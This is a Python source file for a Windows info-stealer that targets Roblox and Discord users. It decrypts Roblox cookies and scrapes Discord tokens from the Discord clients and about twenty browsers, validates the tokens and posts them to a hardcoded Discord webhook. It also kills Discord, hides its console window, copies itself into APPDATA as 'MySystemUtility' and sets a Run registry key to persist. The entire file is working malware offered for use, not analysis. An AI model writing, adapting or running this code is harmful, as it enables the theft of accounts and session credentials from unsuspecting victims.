import os
import shutil
import json
import base64
import win32crypt
import requests
import binascii
import sys
import ctypes
import winreg
import base64 as b64
import re
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

webhook = "https://discord.com/api/webhooks/1513603677913616544/ZMLJ5SgW8My1s_jIHEkL9SlVSsT6dp73KEYKioBkcjKv20yWTLOT1iARD3wlgWN-mcTv"

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        return

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")

    # Перед копированием проверяем и удаляем старый кэш в TEMP
    if os.path.exists(destination_path):
        os.remove(destination_path)

    shutil.copy(roblox_cookies_path, destination_path)

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)

            encoded_cookies = file_content.get("CookiesData", "")

            if encoded_cookies:
                decoded_cookies = base64.b64decode(encoded_cookies)

                try:
                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]

                    requests.post(webhook, json={"content": "Decrypted Content:"})

                    requests.post(webhook, json={"content": decrypted_cookies.decode('utf-8', errors='ignore')})
                except Exception as e:
                    print("Error")
            else:
                print("Error")

        except json.JSONDecodeError as e:
            print("Error")
        except Exception as e:
            print("Error")







# did not make this script just changed to print, credits to the creator




def tokens():
    os.system("taskkill /f /im Discord.exe")
    for token in get_tokens():
        try:
            r = requests.get(
                "https://discordapp.com/api/v6/users/@me",
                headers={"Authorization": token},
            )
            user = r.json()
            user_info = user["username"] + "#" + user["discriminator"]
            #print(f"Token: {token} | User: {user_info}")


            requests.post(webhook, json={"content": f"Token: {token} | User: {user_info}"})

        except:
            pass

def is_base64(s):
    try:
        return base64.b64encode(base64.b64decode(s)) == s.encode()
    except Exception:
        return False

def add_padding(s):
    while len(s) % 4 != 0:
        s += "="
    return s


def decrypt_val(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def get_key(path):
    if not os.path.exists(path):
        return

    if "os_crypt" not in open(path, "r", encoding="utf-8").read():
        return

    with open(path, "r", encoding="utf-8") as f:
        c = f.read()

    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def get_tokens():
    all_tokens = []
    appdata = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
    normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    paths = {
        "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
        "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
        "Lightcord": roaming + "\\Lightcord\\Local Storage\\leveldb\\",
        "Discord PTB": roaming + "\\discordptb\\Local Storage\\leveldb\\",
        "Opera": roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        "Opera GX": roaming
        + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
        "Amigo": appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
        "Torch": appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
        "Kometa": appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
        "Orbitum": appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
        "CentBrowser": appdata + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
        "7Star": appdata + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
        "Sputnik": appdata + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
        "Vivaldi": appdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome SxS": appdata
        + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
        "Chrome": appdata
        + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        "Chrome1": appdata
        + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
        "Chrome2": appdata
        + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
        "Chrome3": appdata
        + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
        "Chrome4": appdata
        + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
        "Chrome5": appdata
        + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
        "Epic Privacy Browser": appdata
        + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
        "Microsoft Edge": appdata
        + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
        "Uran": appdata
        + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
        "Yandex": appdata
        + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Brave": appdata
        + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        "Iridium": appdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
    }
    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        _discord = name.replace(" ", "").lower()
        if "cord" in path:
            if not os.path.exists(roaming + f"\\{_discord}\\Local State"):
                continue
            for file_stuff in os.listdir(path):
                if file_stuff[-3:] not in ["log", "ldb"]:
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{file_stuff}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for i in re.findall(encrypt_regex, line):
                        token = decrypt_val(
                            base64.b64decode(i.split("dQw4w9WgXcQ:")[1]),
                            get_key(roaming + f"\\{_discord}\\Local State"),
                        )
                        all_tokens.append(token)
        else:
            for file_stuff in os.listdir(path):
                if file_stuff[-3:] not in ["log", "ldb"]:
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{file_stuff}", errors="ignore").readlines()
                    if x.strip()
                ]:
                 for i in re.findall(normal_regex, line):
                    try:
                        if is_base64(i):
                            decoded_token = base64.b64decode(add_padding(i)).decode("utf-8")
                            all_tokens.append(decoded_token)
                        else:
                            print("Error")
                    except (UnicodeDecodeError, binascii.Error):
                        print("Error")
    if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
        for path, dirs, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for new_file in files:
                if not new_file.endswith(".sqlite"):
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{new_file}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for token in re.findall(encrypt_regex, line):
                        all_tokens.append(token)
    working = []
    for token in [*set(all_tokens)]:
        url = "https://discord.com/api/v9/users/@me"
        r = requests.get(url, headers={"Authorization": token})
        if r.status_code == 200:
            working.append(token)
        else:
            print("Error")
    return working


def add_to_startup():
    # Миттєво ховаємо чорне вікно консолі відразу при виклику функції
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

    print("...")

    # Визначаємо поточний шлях до файлу
    if getattr(sys, 'frozen', False):
        current_path = os.path.realpath(sys.executable)
        print(s := "...")
    else:
        current_path = os.path.realpath(__file__)
        print(s := "...")

    file_name = os.path.basename(current_path)
    target_dir = os.path.join(os.environ['APPDATA'], 'MySystemUtility')

    # Створюємо цільову папку, якщо її немає
    if not os.path.exists(target_dir):
        try:
            os.makedirs(target_dir)
            print("...")
        except Exception as e:
            print("Error")
            return
    else:
        print("Error")

    target_path = os.path.join(target_dir, file_name)

    # Копіюємо файл у цільову папку
    if current_path != target_path:
        try:
            shutil.copy2(current_path, target_path)
            print("Success")
        except Exception as e:
            print("Error")
            return
    else:
        print("...")

    # Налаштування реєстру Windows
    registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    registry_name = "MyPythonAutostartApp"

    try:
        print("Try")
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key_path, 0, winreg.KEY_SET_VALUE)

        # Формуємо правильну команду запуску залежно від типу файлу
        if target_path.endswith('.py'):
            run_command = f'"{sys.executable}" "{target_path}"'
        else:
            run_command = f'"{target_path}"'

        winreg.SetValueEx(key, registry_name, 0, winreg.REG_SZ, run_command)
        winreg.CloseKey(key)
        print("Success")
    except Exception as e:
        print("Error")


# --- ГОЛОВНА ФУНКЦІЯ (ТОЧКА ВХОДУ) ---
def main_entry():
    # Приховуємо вікно консолі за мікросекунду
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

    # Послідовне фонове виконання ваших функцій
    try: retrieve_roblox_cookies()
    except: pass
    try: tokens()
    except: pass
    try: add_to_startup()
    except: pass

# Цей блок спрацює, ТІЛЬКИ якщо ви запустите файл main.py напряму вручну
if __name__ == "__main__":
    main_entry()

